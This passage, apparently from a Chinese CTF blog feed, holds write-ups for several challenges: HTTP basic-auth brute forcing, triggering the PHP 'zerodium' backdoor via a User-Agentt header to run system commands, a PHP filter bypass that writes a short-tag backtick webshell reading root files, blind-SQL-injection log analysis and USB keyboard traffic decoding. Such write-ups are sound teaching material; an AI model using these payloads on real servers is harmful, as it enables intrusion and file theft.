src="https://img-blog.csdnimg.cn/20210329192024754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>跳转到登陆页面<br><img src="https://img-blog.csdnimg.cn/2021032919204261.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>先输入弱密码admin\123456登陆，然后抓包<br><img src="https://img-blog.csdnimg.cn/20210329192830793.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在请求头发现一段base64编码，解码得到<code>admin:123456</code>，而在响应头发现一段话Do u know admin ?，再结合题目附件中给的字典，所以说本题应该是爆破管理员密码，与以往爆破密码不同的是，账号和密码一起被base64加密了。</p><p>将请求报文发送到Intruder，点击Add，将 Basic 后面 base64 部分添加为 payload position<br><img src="https://img-blog.csdnimg.cn/20210329193459133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>在Payload Options模块中点击load添加字典，在Payload Processing模块中点击添加选择Add prefix，其值为<code>admin:</code>,继续选择encode，其值为base64-encode，最后点击Start attck开始爆破<br><img src="https://img-blog.csdnimg.cn/20210329194328455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>爆破结果按Length排序，发现值为<code>YWRtaW46MTIzMzIx</code>，此时状态码为200，说明是正确的账号密码。<br><img src="https://img-blog.csdnimg.cn/20210329194425899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>base64解密得到<code>admin:123321</code>,输入账号密码登陆得到flag，在响应头也能看到flag<br><img src="https://img-blog.csdnimg.cn/20210329194850620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h2 id="响应包源代码"><a href="#响应包源代码" class="headerlink" title="响应包源代码"></a>响应包源代码</h2><p>HTTP响应包源代码查看</p><p>访问题目地址<br><img src="https://img-blog.csdnimg.cn/20210329195659368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>抓包，发包，在响应包源码发现了flag。<br><img src="https://img-blog.csdnimg.cn/20210329195714758.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>直接查看源代码也可以发现flag<br><img src="https://img-blog.csdnimg.cn/20210329195946922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>参考:<br><a href="https://baike.baidu.com/item/http/243074?fromtitle=HTTP">百度百科-HTTP协议</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：深入学习HTTP协议&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="WEB" scheme="https://swhat.github.io/categories/CTF/WEB/"/>
    
    
    <category term="协议基础" scheme="https://swhat.github.io/tags/%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>虎符+红明谷+ctfshow渔人杯赛后复现</title>
    <link href="https://swhat.github.io/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://swhat.github.io/2021/04/05/%E8%99%8E%E7%AC%A6-%E7%BA%A2%E6%98%8E%E8%B0%B7-ctfshow%E6%B8%94%E4%BA%BA%E6%9D%AF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-05T13:40:02.000Z</published>
    <updated>2021-08-15T03:59:06.619Z</updated>
    
    <content type="html"><![CDATA[<p>摘要：记录最近几场比赛的赛后复现</p> <a id="more"></a><h1 id="虎符CTF"><a href="#虎符CTF" class="headerlink" title="虎符CTF"></a>虎符CTF</h1><h2 id="Web-签到"><a href="#Web-签到" class="headerlink" title="Web-签到"></a>Web-签到</h2><p><img src="https://img-blog.csdnimg.cn/20210404100847899.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>参考<a href="http://cn-sec.com/archives/313267.html">详细分析PHP源代码后门事件及其供应链安全启示</a></p><p>根据文章提示，添加恶意请求头</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumphpinfo();<br></code></pre></td></tr></table></figure><p>可以看到phpinfo内容<br><img src="https://img-blog.csdnimg.cn/20210404100629750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续构造，查看根目录下的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404100940524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>读取flag文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">User-Agentt: zerodiumsystem(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404101127186.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-你会日志分析吗"><a href="#MISC-你会日志分析吗" class="headerlink" title="MISC-你会日志分析吗"></a>MISC-你会日志分析吗</h2><p><img src="https://img-blog.csdnimg.cn/20210404101326722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>分析日志，该日志应该是用脚本进行布尔盲注，最后一步是爆flag的值，发现有两种长度的包，猜测长度377代表爆值成功，长度399代表失败<br><img src="https://img-blog.csdnimg.cn/20210404103342703.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>列出长度为377的值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">90 109 120 104 90 51 116 90 98 51 86 102 89 88 74 108 88 51 78 118 88 50 100 121 90 87 70 48 102 81 61 61<br></code></pre></td></tr></table></figure><p>使用脚本进行处理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">90</span>,<span class="hljs-number">109</span>,<span class="hljs-number">120</span>,<span class="hljs-number">104</span>,<span class="hljs-number">90</span>,<span class="hljs-number">51</span>,<span class="hljs-number">116</span>,<span class="hljs-number">90</span>,<span class="hljs-number">98</span>,<span class="hljs-number">51</span>,<span class="hljs-number">86</span>,<span class="hljs-number">102</span>,<span class="hljs-number">89</span>,<span class="hljs-number">88</span>,<span class="hljs-number">74</span>,<span class="hljs-number">108</span>,<span class="hljs-number">88</span>,<span class="hljs-number">51</span>,<span class="hljs-number">78</span>,<span class="hljs-number">118</span>,<span class="hljs-number">88</span>,<span class="hljs-number">50</span>,<span class="hljs-number">100</span>,<span class="hljs-number">121</span>,<span class="hljs-number">90</span>,<span class="hljs-number">87</span>,<span class="hljs-number">70</span>,<span class="hljs-number">48</span>,<span class="hljs-number">102</span>,<span class="hljs-number">81</span>,<span class="hljs-number">61</span>,<span class="hljs-number">61</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    flag=flag+<span class="hljs-built_in">chr</span>(i)<br>    <br>print(flag)<br>print(base64.b64decode(flag))<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0fQ==<br>b<span class="hljs-string">&#x27;flag&#123;You_are_so_great&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>一个一个找长度为377的包太麻烦了，附上大师傅的脚本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">from base64 import *<br><br>flag = <span class="hljs-string">&#x27;&#x27;</span><br>with open(<span class="hljs-string">&#x27;access.log&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) as f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;select%20flag%20from%20flllag&quot;</span> <span class="hljs-keyword">in</span> line:<br>            packet_len = line[line.find(<span class="hljs-string">&#x27; 200 &#x27;</span>)+5:line.find(<span class="hljs-string">&#x27; &quot;-&quot; &quot;python-requests/2.21.0&quot;&#x27;</span>)]<br>            <span class="hljs-keyword">if</span> packet_len == <span class="hljs-string">&#x27;377&#x27;</span>:<br>                ascii_code = line[line.find(<span class="hljs-string">&#x27;))=&#x27;</span>)+3:line.find(<span class="hljs-string">&#x27;,sleep&#x27;</span>)]<br>                ascii_str = chr(int(ascii_code))<br>                flag += ascii_str<br>            <span class="hljs-keyword">else</span>:<br>                pass<br>        <span class="hljs-keyword">else</span>:<br>            pass<br><br><span class="hljs-built_in">print</span>(b64decode(flag).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><h1 id="红明谷CTF"><a href="#红明谷CTF" class="headerlink" title="红明谷CTF"></a>红明谷CTF</h1><h2 id="Web-write-shell"><a href="#Web-write-shell" class="headerlink" title="Web-write_shell"></a>Web-write_shell</h2><p>没报上名，在BUU上面找到的环境<br><img src="https://img-blog.csdnimg.cn/20210405165110827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>知识点：短标签绕过php过滤</strong></p><blockquote><p>PHP开启短标签即short_open_tag=on时，可以使用<?=$_?>输出变量</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>  <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = waf(<span class="hljs-variable">$output</span>);<br>      &#125;<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = check(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$dir</span>))&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<br>        waf(<span class="hljs-variable">$data</span>);<br>        file_put_contents(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>审计代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、写入文件，但是对<span class="hljs-variable">$data</span>变量进行了过滤<br>2、使用&lt;?=?&gt; 短标签即可绕过php然后输出<br>3、用反引号直接执行命令<br>4、过滤了空格,用%09代替空格<br></code></pre></td></tr></table></figure><p>根据源码，先查看当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=<span class="hljs-built_in">pwd</span> <br><span class="hljs-comment">#sandbox/d99081fe929b750e0557f85e6499103f/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404173216510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>尝试读取根目录下的所有文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: ?action=upload&amp;data=&lt;?=`cat%09/*`?&gt;<br></code></pre></td></tr></table></figure><p>最后访问<code>/sandbox/d99081fe929b750e0557f85e6499103f/</code>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404173408667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="MISC-我的心是冰冰的"><a href="#MISC-我的心是冰冰的" class="headerlink" title="MISC-我的心是冰冰的"></a>MISC-我的心是冰冰的</h2><p>题目描述：似乎有信息被隐藏了。</p><p>打开rar压缩包文件受损，可能存在RAR伪加密，按照<a href="https://l1near.top/index.php/2021/03/15/97.html#comment-174">L1near师傅的博客</a>，将24字节处的84改为80即可<br><img src="https://img-blog.csdnimg.cn/20210404180245275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解压压缩包得到<br><img src="https://img-blog.csdnimg.cn/20210404180359809.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看wp发现是java盲水印</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar BlindWatermark.jar decode -c bingbing.jpg decode.jpg<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210408214553555.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得到口令<code>gnibgnib</code>，解压得到bingbing.pcapng流量包，发现数据是16位，所以是USB键盘流量<br><img src="https://img-blog.csdnimg.cn/20210404201547272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>tshark提取USB流量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021040418495794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>剔除空行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r bingbing.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185033903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用脚本加上冒号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    a=f.readline().strip()<br>    <span class="hljs-keyword">if</span> a:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)==<span class="hljs-number">16</span>: <span class="hljs-comment"># 键盘流量的话len改为16</span><br>            out=<span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>            fi.write(out)<br>            fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br><br>fi.close()<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210404185301518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>通用脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">mappings = &#123; <span class="hljs-number">0x04</span>:<span class="hljs-string">&quot;A&quot;</span>,  <span class="hljs-number">0x05</span>:<span class="hljs-string">&quot;B&quot;</span>,  <span class="hljs-number">0x06</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-number">0x07</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-number">0x08</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-number">0x09</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-number">0x0A</span>:<span class="hljs-string">&quot;G&quot;</span>,  <span class="hljs-number">0x0B</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-number">0x0C</span>:<span class="hljs-string">&quot;I&quot;</span>,  <span class="hljs-number">0x0D</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-number">0x0E</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-number">0x0F</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-number">0x10</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-number">0x11</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-number">0x12</span>:<span class="hljs-string">&quot;O&quot;</span>,  <span class="hljs-number">0x13</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-number">0x14</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-number">0x15</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-number">0x16</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-number">0x17</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-number">0x18</span>:<span class="hljs-string">&quot;U&quot;</span>,<span class="hljs-number">0x19</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-number">0x1A</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-number">0x1B</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-number">0x1C</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-number">0x1D</span>:<span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-number">0x1E</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-number">0x1F</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-number">0x20</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-number">0x21</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-number">0x22</span>:<span class="hljs-string">&quot;5&quot;</span>,  <span class="hljs-number">0x23</span>:<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-number">0x24</span>:<span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-number">0x25</span>:<span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-number">0x26</span>:<span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-number">0x27</span>:<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-number">0x28</span>:<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-number">0x2a</span>:<span class="hljs-string">&quot;[DEL]&quot;</span>,  <span class="hljs-number">0X2B</span>:<span class="hljs-string">&quot;    &quot;</span>, <span class="hljs-number">0x2C</span>:<span class="hljs-string">&quot; &quot;</span>,  <span class="hljs-number">0x2D</span>:<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-number">0x2E</span>:<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-number">0x2F</span>:<span class="hljs-string">&quot;[&quot;</span>,  <span class="hljs-number">0x30</span>:<span class="hljs-string">&quot;]&quot;</span>,  <span class="hljs-number">0x31</span>:<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-number">0x32</span>:<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-number">0x33</span>:<span class="hljs-string">&quot;;&quot;</span>,  <span class="hljs-number">0x34</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-number">0x36</span>:<span class="hljs-string">&quot;,&quot;</span>,  <span class="hljs-number">0x37</span>:<span class="hljs-string">&quot;.&quot;</span> &#125;<br><br>nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> line[<span class="hljs-number">0</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">1</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">3</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">4</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span 